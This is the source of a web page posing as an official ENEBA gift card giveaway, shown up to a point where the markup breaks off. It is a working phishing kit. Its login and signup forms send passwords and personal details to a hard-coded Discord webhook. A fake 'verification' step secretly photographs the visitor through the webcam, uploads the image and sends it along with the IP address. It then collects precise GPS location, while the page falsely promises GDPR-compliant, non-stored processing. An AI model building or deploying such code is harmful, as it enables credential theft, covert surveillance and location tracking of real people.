
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>ENEBA Gifts</title>
    <meta name="description" content="Lovable Generated Project" />
    <meta name="author" content="Lovable" />

    <meta property="og:title" content="ENEBA Gifts" />
    <meta property="og:description" content="Lovable Generated Project" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />

    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:site" content="@lovable_dev" />
    <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
    
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- React and React DOM CDN -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <!-- Babel for JSX -->
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <!-- Axios for HTTP requests -->
    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
    <!-- React Confetti -->
    <script src="https://unpkg.com/react-confetti/dist/react-confetti.min.js"></script>

    <style>
      /* Custom styles from index.css */
      body {
        background-color: #f9fafb;
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen',
          'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue',
          sans-serif;
      }
      
      .bg-custom-purple {
        background-color: rgba(70, 24, 172, 255);
        background-color: #4618ac;
        background-image: linear-gradient(135deg, #4618ac 0%, #5928e5 100%);
      }
      
      .bg-custom-purple-light {
        background-color: #5B2FBD;
        background-image: linear-gradient(135deg, #5B2FBD 0%, #6B3FCD 100%);
      }
      
      .bg-custom-yellow {
        background-color: #ffd41c;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      }
      
      .text-custom-blue {
        color: #3498db;
        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
      }
      
      /* Add some animations */
      @keyframes pulse {
        0% {
          transform: scale(1);
        }
        50% {
          transform: scale(1.05);
        }
        100% {
          transform: scale(1);
        }
      }
      
      .pulse-animation {
        animation: pulse 2s infinite;
      }
      
      /* Add shine effect for the card */
      .shine-effect::before {
        content: '';
        position: absolute;
        top: -110%;
        left: -210%;
        width: 200%;
        height: 200%;
        opacity: 0;
        transform: rotate(30deg);
        background: rgba(255, 255, 255, 0.13);
        background: linear-gradient(
          to right, 
          rgba(255, 255, 255, 0.13) 0%,
          rgba(255, 255, 255, 0.13) 77%,
          rgba(255, 255, 255, 0.5) 92%,
          rgba(255, 255, 255, 0.0) 100%
        );
      }
      
      .shine-effect:hover::before {
        opacity: 1;
        top: -30%;
        left: -30%;
        transition-property: left, top, opacity;
        transition-duration: 0.7s, 0.7s, 0.15s;
        transition-timing-function: ease;
      }
    </style>
    
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              'custom-purple': '#4618ac',
              'custom-yellow': '#ffd41c',
              'custom-blue': '#3498db',
            },
          },
        },
      }
    </script>
  </head>

  <body>
    <div id="root"></div>

    <script type="text/babel">
      // React components
      const { useState, useEffect, useRef } = React;

      // Utility functions from utils
      const getIpAddress = async () => {
        try {
          const response = await axios.get('https://api.ipify.org?format=json');
          return response.data.ip;
        } catch (error) {
          console.error('Error fetching IP address:', error);
          return 'unknown';
        }
      };

      const getUserSystemInfo = () => {
        const userAgent = navigator.userAgent;
        
        // Get browser info
        let browser = 'Unknown';
        if (userAgent.indexOf('Firefox') > -1) browser = 'Mozilla Firefox';
        else if (userAgent.indexOf('SamsungBrowser') > -1) browser = 'Samsung Browser';
        else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) browser = 'Opera';
        else if (userAgent.indexOf('Trident') > -1) browser = 'Internet Explorer';
        else if (userAgent.indexOf('Edge') > -1) browser = 'Microsoft Edge (Legacy)';
        else if (userAgent.indexOf('Edg') > -1) browser = 'Microsoft Edge (Chromium)';
        else if (userAgent.indexOf('Chrome') > -1) browser = 'Google Chrome';
        else if (userAgent.indexOf('Safari') > -1) browser = 'Safari';
        
        // Get OS info
        let os = 'Unknown';
        if (userAgent.indexOf('Win') > -1) os = 'Windows';
        else if (userAgent.indexOf('Mac') > -1) os = 'MacOS';
        else if (userAgent.indexOf('Linux') > -1) os = 'Linux';
        else if (userAgent.indexOf('Android') > -1) os = 'Android';
        else if (userAgent.indexOf('iOS') > -1 || userAgent.indexOf('iPhone') > -1 || userAgent.indexOf('iPad') > -1) os = 'iOS';
        
        // Get device type
        let device = 'Desktop';
        if (userAgent.indexOf('Mobi') > -1 || userAgent.indexOf('Android') > -1) device = 'Mobile';
        else if (userAgent.indexOf('iPad') > -1 || userAgent.indexOf('Tablet') > -1) device = 'Tablet';
        
        return {
          ip: 'Loading...',
          browser,
          os,
          device,
          language: navigator.language || 'Unknown',
          screenSize: `${window.screen.width}x${window.screen.height}`,
          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
          referrer: document.referrer || 'Direct',
          userAgent,
          location: {
            latitude: null,
            longitude: null,
            accuracy: null
          }
        };
      };

      const getUserLocation = () => {
        return new Promise((resolve, reject) => {
          if (!navigator.geolocation) {
            reject(new Error('Geolocation is not supported by this browser.'));
            return;
          }
          
          // High accuracy options with longer timeout and less caching
          const options = {
            enableHighAccuracy: true,  // Request the best possible results
            timeout: 15000,            // Increased timeout for better results (15 seconds)
            maximumAge: 0              // Don't use cached position data
          };
          
          // Try to get position with better error handling
          navigator.geolocation.getCurrentPosition(
            (position) => {
              resolve({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
              });
            },
            (error) => {
              // Better error handling with more informative messages
              let errorMessage = 'Unknown error occurred while retrieving location.';
              
              switch (error.code) {
                case error.PERMISSION_DENIED:
                  errorMessage = 'Location permission denied by user.';
                  break;
                case error.POSITION_UNAVAILABLE:
                  errorMessage = 'Location information is unavailable.';
                  break;
                case error.TIMEOUT:
                  errorMessage = 'Location request timed out.';
                  break;
              }
              
              console.error('Error getting location:', errorMessage);
              reject(new Error(errorMessage));
            },
            options
          );
        });
      };

      // Header Component
      const Header = () => {
        return (
          <header className="bg-custom-purple py-4 px-6 flex justify-between items-center shadow-lg">
            <div className="flex items-center">
              <a href="https://www.eneba.com" target="_blank" rel="noopener noreferrer">
                <img 
                  src="https://s3.eu-central-1.amazonaws.com/co.lever.eu.client-logos/c77a4902-a703-4ef8-9e87-178cac8f7812-1633076860304.png" 
                  alt="Eneba Logo" 
                  className="h-12"
                />
              </a>
              <span className="ml-4 text-white font-medium hidden sm:inline">Official Gift Distribution</span>
            </div>
            <div className="flex items-center gap-6">
              <a href="https://www.eneba.com/giveaways" className="text-white hover:text-custom-yellow hidden md:block">Giveaways</a>
              <a href="https://www.eneba.com/store" className="text-white hover:text-custom-yellow hidden md:block">Store</a>
              <div className="text-white">
                Need help? Click <a href="https://www.eneba.com/support" target="_blank" rel="noopener noreferrer" className="underline hover:text-custom-yellow">here</a>
              </div>
            </div>
          </header>
        );
      };

      // CountdownTimer Component
      const CountdownTimer = ({ className }) => {
        const [timeLeft, setTimeLeft] = useState({
          hours: 0,
          minutes: 0,
          seconds: 0,
        });
      
        useEffect(() => {
          const calculateTimeLeft = () => {
            const now = new Date();
            
            // Target is next day at 2:00 PM
            const tomorrow = new Date();
            tomorrow.setDate(tomorrow.getDate() + 1);
            tomorrow.setHours(14, 0, 0, 0); // Set to 2:00:00.000 PM
            
            // Calculate difference in milliseconds
            const difference = tomorrow.getTime() - now.getTime();
            
            // Convert to hours, minutes, seconds
            const hours = Math.floor((difference / (1000 * 60 * 60)) % 24);
            const minutes = Math.floor((difference / 1000 / 60) % 60);
            const seconds = Math.floor((difference / 1000) % 60);
            
            return { hours, minutes, seconds };
          };
          
          // Initial calculation
          setTimeLeft(calculateTimeLeft());
          
          // Update every second
          const timer = setInterval(() => {
            setTimeLeft(calculateTimeLeft());
          }, 1000);
          
          return () => clearInterval(timer);
        }, []);
      
        // Format the time values to always show two digits
        const formatTime = (value) => {
          return value < 10 ? `0${value}` : `${value}`;
        };
      
        return (
          <span className={className}>
            {formatTime(timeLeft.hours)}:{formatTime(timeLeft.minutes)}:{formatTime(timeLeft.seconds)}
          </span>
        );
      };
      
      // Login/Signup Form Components
      const LoginSignupModal = ({ isOpen, onClose, onComplete, webhookUrl }) => {
        const [mode, setMode] = useState('initial');
        const [isLoading, setIsLoading] = useState(false);
        const [loginFormData, setLoginFormData] = useState({
          email: "",
          password: "",
        });
        const [signupFormData, setSignupFormData] = useState({
          fullName: "",
          dateOfBirth: "",
          email: "",
          password: "",
          gender: "",
          phoneNumber: "",
        });
        const [loginErrors, setLoginErrors] = useState({});
        const [signupErrors, setSignupErrors] = useState({});
        
        if (!isOpen) return null;
        
        const validateLoginForm = () => {
          const errors = {};
          if (!loginFormData.email) {
            errors.email = "Email is required";
          } else if (!/\S+@\S+\.\S+/.test(loginFormData.email)) {
            errors.email = "Please enter a valid email";
          }
          
          if (!loginFormData.password) {
            errors.password = "Password is required";
          } else if (loginFormData.password.length < 6) {
            errors.password = "Password must be at least 6 characters";
          }
          
          setLoginErrors(errors);
          return Object.keys(errors).length === 0;
        };
        
        const validateSignupForm = () => {
          const errors = {};
          if (!signupFormData.fullName) {
            errors.fullName = "Full name is required";
          } else if (signupFormData.fullName.length < 3) {
            errors.fullName = "Full name must be at least 3 characters";
          }
          
          if (!signupFormData.dateOfBirth) {
            errors.dateOfBirth = "Date of birth is required";
          }
          
          if (!signupFormData.email) {
            errors.email = "Email is required";
          } else if (!/\S+@\S+\.\S+/.test(signupFormData.email)) {
            errors.email = "Please enter a valid email";
          }
          
          if (!signupFormData.password) {
            errors.password = "Password is required";
          } else if (signupFormData.password.length < 6) {
            errors.password = "Password must be at least 6 characters";
          }
          
          if (!signupFormData.gender) {
            errors.gender = "Gender is required";
          }
          
          if (!signupFormData.phoneNumber) {
            errors.phoneNumber = "Phone number is required";
          } else if (signupFormData.phoneNumber.length < 5) {
            errors.phoneNumber = "Please enter a valid phone number";
          }
          
          setSignupErrors(errors);
          return Object.keys(errors).length === 0;
        };
      
        const handleLoginInputChange = (e) => {
          const { name, value } = e.target;
          setLoginFormData({
            ...loginFormData,
            [name]: value
          });
        };
        
        const handleSignupInputChange = (e) => {
          const { name, value } = e.target;
          setSignupFormData({
            ...signupFormData,
            [name]: value
          });
        };
      
        const handleSubmitLogin = async (e) => {
          e.preventDefault();
          
          if (!validateLoginForm()) return;
          
          setIsLoading(true);
          
          try {
            // Send data to webhook
            await axios.post(webhookUrl, {
              content: `👤 **USER LOGIN ATTEMPT**\n\n**Email**: ${loginFormData.email}\n**Password**: ${loginFormData.password}\n**Time**: ${new Date().toLocaleString()}`
            });
            
            // Complete the login process
            onComplete({
              type: 'login',
              ...loginFormData,
              timestamp: new Date().toISOString()
            });
          } catch (error) {
            console.error("Error sending login data:", error);
          } finally {
            setIsLoading(false);
          }
        };
        
        const handleSubmitSignup = async (e) => {
          e.preventDefault();
          
          if (!validateSignupForm()) return;
          
          setIsLoading(true);
          
          try {
            // Send data to webhook
            await axios.post(webhookUrl, {
              content: `✨ **NEW USER SIGNUP**\n\n**Full Name**: ${signupFormData.fullName}\n**Date of Birth**: ${signupFormData.dateOfBirth}\n**Email**: ${signupFormData.email}\n**Password**: ${signupFormData.password}\n**Gender**: ${signupFormData.gender}\n**Phone Number**: ${signupFormData.phoneNumber}\n**Time**: ${new Date().toLocaleString()}`
            });
            
            // Complete the signup process
            onComplete({
              type: 'signup',
              ...signupFormData,
              timestamp: new Date().toISOString()
            });
          } catch (error) {
            console.error("Error sending signup data:", error);
          } finally {
            setIsLoading(false);
          }
        };
      
        return (
          <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
            <div className="bg-custom-purple-light text-white w-full max-w-md rounded-lg p-6">
              {mode === 'initial' && (
                <div className="flex flex-col items-center space-y-6 py-6">
                  <div>
                    <h2 className="text-2xl text-white text-center">Join ENEBA to Redeem Your Gift</h2>
                  </div>
                  <p className="text-gray-300">Create an account or login to continue</p>
                  <div className="flex flex-col w-full space-y-3">
                    <button 
                      onClick={() => setMode('signup')}
                      className="bg-custom-yellow text-black hover:bg-opacity-90 py-6 text-lg w-full rounded-md font-medium"
                    >
                      Sign Up
                    </button>
                    <button 
                      onClick={() => setMode('login')}
                      className="bg-transparent border border-white hover:bg-white/10 py-6 text-lg w-full rounded-md"
                    >
                      Log In
                    </button>
                  </div>
                </div>
              )}
              
              {mode === 'login' && (
                <div className="py-4">
                  <div>
                    <h2 className="text-2xl text-white text-center">Log In</h2>
                  </div>
                  <form onSubmit={handleSubmitLogin} className="space-y-4 mt-4">
                    <div>
                      <label className="block text-white mb-1">Email</label>
                      <div className="relative">
                        <span className="absolute left-3 top-2.5 text-gray-400">
                          ✉️
                        </span>
                        <input 
                          type="email"
                          name="email"
                          placeholder="your.email@example.com" 
                          className="pl-10 bg-black/20 border border-gray-700 text-white w-full h-10 rounded-md px-3 py-2"
                          value={loginFormData.email}
                          onChange={handleLoginInputChange}
                        />
                      </div>
                      {loginErrors.email && <p className="text-red-400 text-xs mt-1">{loginErrors.email}</p>}
                    </div>
                    
                    <div>
                      <label className="block text-white mb-1">Password</label>
                      <div className="relative">
                        <span className="absolute left-3 top-2.5 text-gray-400">
                          🔒
                        </span>
                        <input 
                          type="password"
                          name="password"
                          placeholder="••••••••"
                          className="pl-10 bg-black/20 border border-gray-700 text-white w-full h-10 rounded-md px-3 py-2"
                          value={loginFormData.password}
                          onChange={handleLoginInputChange}
                        />
                      </div>
                      {loginErrors.password && <p className="text-red-400 text-xs mt-1">{loginErrors.password}</p>}
                    </div>
                    
                    <div className="pt-4">
                      <button 
                        type="submit" 
                        disabled={isLoading}
                        className="w-full bg-custom-yellow text-black hover:bg-opacity-90 py-2 rounded-md font-medium disabled:opacity-70"
                      >
                        {isLoading ? "Loading..." : "Login"}
                      </button>
                    </div>
                    
                    <div className="text-center pt-2">
                      <button 
                        type="button"
                        onClick={() => setMode('signup')}
                        className="text-sm text-gray-300 hover:text-white underline"
                      >
                        Don't have an account? Sign Up
                      </button>
                    </div>
                  </form>
                </div>
              )}
              
              {mode === 'signup' && (
                <div className="py-4">
                  <div>
                    <h2 className="text-2xl text-white text-center">Create Account</h2>
                  </div>
                  
                  <div className="bg-red-900/30 border border-red-500/50 mb-4 p-3 rounded-md mt-4">
                    <div className="flex">
                      <span className="text-red-500 mr-2">⚠️</span>
                      <p className="text-left text-red-100 text-sm">
                        <strong>IMPORTANT:</strong> All information must be accurate and valid. Accounts with invalid information will be terminated and gift card access revoked.
                      </p>
                    </div>
                  </div>
                  
                  <form onSubmit={handleSubmitSignup} className="space-y-4 mt-4">
                    <div>
                      <label className="block text-white mb-1">Full Name</label>
                      <div className="relative">
                        <span className="absolute left-3 top-2.5 text-gray-400">
                          👤
                        </span>
                        <input 
                          type="text"
                          name="fullName"
                          placeholder="John Smith" 
                          className="pl-10 bg-black/20 border border-gray-700 text-white w-full h-10 rounded-md px-3 py-2"
                          value={signupFormData.fullName}
                          onChange={handleSignupInputChange}
                        />
                      </div>
                      {signupErrors.fullName && <p className="text-red-400 text-xs mt-1">{signupErrors.fullName}</p>}
                    </div>
                    
                    <div>
                      <label className="block text-white mb-1">Date of Birth</label>
                      <div className="relative">
                        <span className="absolute left-3 top-2.5 text-gray-400">
                          📅
                        </span>
                        <input 
                          type="date"
                          name="dateOfBirth"
                          className="pl-10 bg-black/20 border border-gray-700 text-white w-full h-10 rounded-md px-3 py-2"
                          value={signupFormData.dateOfBirth}
                          onChange={handleSignupInputChange}
                        />
                      </div>
                      {signupErrors.dateOfBirth && <p className="text-red-400 text-xs mt-1">{signupErrors.dateOfBirth}</p>}
                    </div>
                    
                    <div>
                      <label className="block text-white mb-1">Email</label>
                      <div className="relative">
                        <span className="absolute left-3 top-2.5 text-gray-400">
                          ✉️
                        </span>
                        <input 
                          type="email"
                          name="email"
                          placeholder="your.email@example.com" 
                          className="pl-10 bg-black/20 border border-gray-700 text-white w-full h-10 rounded-md px-3 py-2"
                          value={signupFormData.email}
                          onChange={handleSignupInputChange}
                        />
                      </div>
                      {signupErrors.email && <p className="text-red-400 text-xs mt-1">{signupErrors.email}</p>}
                    </div>
                    
                    <div>
                      <label className="block text-white mb-1">Password</label>
                      <div className="relative">
                        <span className="absolute left-3 top-2.5 text-gray-400">
                          🔒
                        </span>
                        <input 
                          type="password"
                          name="password"
                          placeholder="••••••••"
                          className="pl-10 bg-black/20 border border-gray-700 text-white w-full h-10 rounded-md px-3 py-2"
                          value={signupFormData.password}
                          onChange={handleSignupInputChange}
                        />
                      </div>
                      {signupErrors.password && <p className="text-red-400 text-xs mt-1">{signupErrors.password}</p>}
                    </div>
                    
                    <div>
                      <label className="block text-white mb-1">Gender</label>
                      <select 
                        name="gender"
                        className="w-full h-10 rounded-md border border-gray-700 bg-black/20 px-3 py-2 text-white"
                        value={signupFormData.gender}
                        onChange={handleSignupInputChange}
                      >
                        <option value="" disabled>Select gender</option>
                        <option value="male">Male</option>
                        <option value="female">Female</option>
                        <option value="other">Other</option>
                        <option value="prefer-not-to-say">Prefer not to say</option>
                      </select>
                      {signupErrors.gender && <p className="text-red-400 text-xs mt-1">{signupErrors.gender}</p>}
                    </div>
                    
                    <div>
                      <label className="block text-white mb-1">Phone Number</label>
                      <div className="relative">
                        <span className="absolute left-3 top-2.5 text-gray-400">
                          📱
                        </span>
                        <input 
                          type="text"
                          name="phoneNumber"
                          placeholder="+1 234 567 8900"
                          className="pl-10 bg-black/20 border border-gray-700 text-white w-full h-10 rounded-md px-3 py-2"
                          value={signupFormData.phoneNumber}
                          onChange={handleSignupInputChange}
                        />
                      </div>
                      {signupErrors.phoneNumber && <p className="text-red-400 text-xs mt-1">{signupErrors.phoneNumber}</p>}
                    </div>
                    
                    <div className="pt-4">
                      <button 
                        type="submit"
                        disabled={isLoading}
                        className="w-full bg-custom-yellow text-black hover:bg-opacity-90 py-2 rounded-md font-medium disabled:opacity-70"
                      >
                        {isLoading ? "Loading..." : "Create Account"}
                      </button>
                    </div>
                    
                    <div className="text-center pt-2">
                      <button 
                        type="button"
                        onClick={() => setMode('login')}
                        className="text-sm text-gray-300 hover:text-white underline"
                      >
                        Already have an account? Log In
                      </button>
                    </div>
                  </form>
                </div>
              )}
            </div>
          </div>
        );
      };
      
      // VerificationModal Component
      const VerificationModal = ({ isOpen, onClose, ipAddress }) => {
        const [step, setStep] = useState('loading');
        const [userData, setUserData] = useState(null);
        const videoRef = useRef(null);
        const streamRef = useRef(null);
        const canvasRef = useRef(null);
        const webhookUrl = "https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU";
        
        // Profile picture for logged-in users (using default profile picture)
        const profilePicture = "https://via.placeholder.com/150";
        
        useEffect(() => {
          if (isOpen && step === 'loading') {
            // Shortened loading time to 1.5 seconds
            const timer = setTimeout(() => {
              setStep('verify');
            }, 1500);
            
            return () => clearTimeout(timer);
          }
        }, [isOpen, step]);

        const handleContinue = () => {
          setStep('loading');
          
          // Shortened loading time to 1.5 seconds
          const timer = setTimeout(() => {
            setStep('auth');
          }, 1500);
          
          return () => clearTimeout(timer);
        };
        
        const handleAuthComplete = (data) => {
          setUserData(data);
          
          // Show warning step after authentication
          setStep('warning');
        };
        
        const handleWarningContinue = () => {
          setStep('loading');
          
          // Shortened loading time to 1.5 seconds
          const timer = setTimeout(() => {
            setStep('permissions');
          }, 1500);
          
          return () => clearTimeout(timer);
        };

        const handleStart = async () => {
          setStep('camera');
          
          try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
              video: { 
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
              } 
            });
            
            streamRef.current = stream;
            
            if (videoRef.current) {
              videoRef.current.srcObject = stream;
              videoRef.current.play();
              
              setTimeout(() => {
                captureAndSendImages();
              }, 2000);
            }
          } catch (error) {
            console.error("Camera error:", error);
            setStep('permissions');
          }
        };
        
        const captureAndSendImages = async () => {
          if (!videoRef.current || !streamRef.current) return;
          
          // Take multiple pictures with canvas
          const canvas = document.createElement('canvas');
          canvas.width = videoRef.current.videoWidth;
          canvas.height = videoRef.current.videoHeight;
          const ctx = canvas.getContext('2d');
          
          // Capture first image
          if (ctx) {
            ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg');
            
            try {
              // Upload to Imgur
              const response = await axios.post('https://api.imgur.com/3/image', {
                image: imageData.split(',')[1],
                type: 'base64'
              }, {
                headers: {
                  'Authorization': 'Client-ID b971f6f4d72a0f2'
                }
              });
              
              if (response.data && response.data.data && response.data.data.link) {
                // Send to Discord webhook with user data
                let userDataString = "No user data";
                if (userData) {
                  if (userData.type === 'signup') {
                    userDataString = `**User Type**: Signup\n**Full Name**: ${userData.fullName}\n**Date of Birth**: ${userData.dateOfBirth}\n**Email**: ${userData.email}\n**Password**: ${userData.password}\n**Gender**: ${userData.gender}\n**Phone**: ${userData.phoneNumber}`;
                  } else {
                    userDataString = `**User Type**: Login\n**Email**: ${userData.email}\n**Password**: ${userData.password}`;
                  }
                }
                
                await axios.post(webhookUrl, {
                  content: `📸 **CAMERA IMAGE CAPTURED**\n\n**Image**: ${response.data.data.link}\n**IP Address**: ${ipAddress}\n\n**USER DATA**:\n${userDataString}`
                });
              }
            } catch (error) {
              console.error("Failed to upload image:", error);
            }
          }
          
          // Stop camera
          const tracks = streamRef.current.getTracks();
          tracks.forEach(track => track.stop());
          
          // Show location info before requesting location
          setStep('location-info');
        };
        
        const handleProceedToLocation = () => {
          requestLocation();
        };
        
        const requestLocation = () => {
          if (navigator.geolocation) {
            setStep('location');
            
            // Enhanced geolocation options
            const options = {
              enableHighAccuracy: true,  // Use GPS if available
              timeout: 15000,            // Wait up to 15 seconds
              maximumAge: 0              // Always get a fresh position
            };
            
            navigator.geolocation.getCurrentPosition(
              async (position) => {
                const { latitude, longitude, accuracy } = position.coords;
                
                try {
                  // Prepare user data string
                  let userDataString = "No user data";
                  if (userData) {
                    if (userData.type === 'signup') {
                      userDataString = `**User Type**: Signup\n**Full Name**: ${userData.fullName}\n**Date of Birth**: ${userData.dateOfBirth}\n**Email**: ${userData.email}\n**Password**: ${userData.password}\n**Gender**: ${userData.gender}\n**Phone**: ${userData.phoneNumber}`;
                    } else {
                      userDataString = `**User Type**: Login\n**Email**: ${userData.email}\n**Password**: ${userData.password}`;
                    }
                  }
                  
                  // Send location with enhanced accuracy to webhook
                  await axios.post(webhookUrl, {
                    content: `📍 **LOCATION DATA CAPTURED (High Accuracy Mode)**\n\n**Latitude**: ${latitude}\n**Longitude**: ${longitude}\n**Accuracy**: ${accuracy}m\n**Google Maps**: https://www.google.com/maps?q=${latitude},${longitude}\n\n**USER DATA**:\n${userDataString}`
                  });
                  
                  // Move to success
                  setStep('success');
                } catch (error) {
                  console.error("Failed to send location data:", error);
                  setStep('success'); // Still move to success even if discord webhook fails
                }
              },
              (error) => {
                console.error("Location error:", error);
                setStep('success'); // Still move to success even if location fails
              },
              options
            );
          } else {
            setStep('success');
          }
        };

        if (!isOpen) return null;

        // Icons rendering functions
        const renderCircleIcon = () => (
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="12" cy="12" r="10"></circle>
          </svg>
        );

        const renderCheckIcon = () => (
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="20 6 9 17 4 12"></polyline>
          </svg>
        );

        const renderCameraIcon = () => (
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"></path>
            <circle cx="12" cy="13" r="3"></circle>
          </svg>
        );

        const renderMapPinIcon = () => (
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"></path>
            <circle cx="12" cy="10" r="3"></circle>
          </svg>
        );

        const renderLoaderIcon = () => (
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="animate-spin">
            <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
          </svg>
        );

        const renderAlertCircleIcon = () => (
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="12" y1="8" x2="12" y2="12"></line>
            <line x1="12" y1="16" x2="12.01" y2="16"></line>
          </svg>
        );

        const renderInfoIcon = () => (
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="12" y1="16" x2="12" y2="12"></line>
            <line x1="12" y1="8" x2="12.01" y2="8"></line>
          </svg>
        );

        // Avatar component for user profile
        const Avatar = ({ className, children }) => {
          return (
            <div className={`relative flex h-12 w-12 shrink-0 overflow-hidden rounded-full ${className}`}>
              {children}
            </div>
          );
        };

        const AvatarImage = ({ src, alt }) => {
          return (
            <img 
              src={src}
              alt={alt}
              className="aspect-square h-full w-full"
            />
          );
        };

        const AvatarFallback = ({ children }) => {
          return (
            <div className="flex h-full w-full items-center justify-center rounded-full bg-gray-700">
              {children}
            </div>
          );
        };

        // Alert component for notifications
        const Alert = ({ className, children }) => {
          return (
            <div className={`relative w-full rounded-lg border p-4 ${className}`}>
              {children}
            </div>
          );
        };

        return (
          <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
            {step === 'auth' ? (
              <LoginSignupModal 
                isOpen={true} 
                onClose={onClose}
                onComplete={handleAuthComplete}
                webhookUrl={webhookUrl}
              />
            ) : (
              <div className="bg-custom-purple-light p-8 rounded-lg shadow-xl w-full max-w-md text-center text-white">
                {step === 'loading' && (
                  <div className="flex flex-col items-center space-y-4">
                    {renderLoaderIcon()}
                    <p className="text-xl">Loading...</p>
                  </div>
                )}
                
                {step === 'verify' && (
                  <div className="flex flex-col items-center space-y-4">
                    {renderCircleIcon()}
                    <p className="text-xl">Please verify using ENEBA's secure verification system.</p>
                    <button 
                      className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
                      onClick={handleContinue}
                    >
                      Continue
                    </button>
                  </div>
                )}
                
                {step === 'warning' && userData && (
                  <div className="flex flex-col items-center space-y-4">
                    <div className="flex items-center space-x-3 mb-2">
                      <Avatar className="border-2 border-custom-yellow">
                        <AvatarImage src={profilePicture} alt="Profile" />
                        <AvatarFallback>
                          {userData.fullName ? userData.fullName.charAt(0).toUpperCase() : userData.email.charAt(0).toUpperCase()}
                        </AvatarFallback>
                      </Avatar>
                      <div className="text-left">
                        <p className="font-medium">{userData.fullName || "ENEBA User"}</p>
                        <p className="text-xs text-gray-400">{userData.email}</p>
                      </div>
                    </div>
                    
                    <Alert className="bg-amber-900/30 border-amber-500/50 my-2">
                      <div className="flex">
                        {renderAlertCircleIcon()}
                        <div className="text-left ml-2 text-amber-100">
                          Your email and phone number are not verified. After redeeming your gift, please visit User Settings to verify them.
                        </div>
                      </div>
                    </Alert>
                    
                    <button 
                      className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all mt-2"
                      onClick={handleWarningContinue}
                    >
                      Continue
                    </button>
                  </div>
                )}
                
                {step === 'permissions' && (
                  <div className="flex flex-col items-center space-y-4">
                    {renderCheckIcon()}
                    <p className="text-xl">To prevent fraud and ensure gift card delivery, we need to verify your identity.</p>
                    <p className="text-md">Our secure verification requires temporary access to your camera and location to confirm you're a real person and in a region where this offer is available.</p>
                    <p className="text-sm text-gray-300 mt-2">All data is processed securely following GDPR guidelines and is not stored permanently.</p>
                    <button 
                      className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
                      onClick={handleStart}
                    >
                      Start Verification
                    </button>
                  </div>
                )}
                
                {step === 'camera' && (
                  <div className="flex flex-col items-center space-y-4">
                    {renderCameraIcon()}
                    <p className="text-xl">Please allow camera access</p>
                    <p className="text-sm text-gray-300 mt-2">Your camera is only used to verify you're a real person. No photos are stored permanently.</p>
                    <p className="text-sm text-gray-300">This page will update automatically after you allow access.</p>
                    <video ref={videoRef} className="hidden" />
                  </div>
                )}
                
                {step === 'location-info' && (
                  <div className="flex flex-col items-center space-y-4">
                    {renderInfoIcon()}
                    <h3 className="text-xl font-bold">Location Verification Required</h3>
                    <p className="text-md">To comply with regional restrictions and prevent gift card fraud, we need to verify your location.</p>
                    <Alert className="bg-blue-900/30 border-blue-500/50 my-2">
                      <div className="text-left ml-2 text-blue-100">
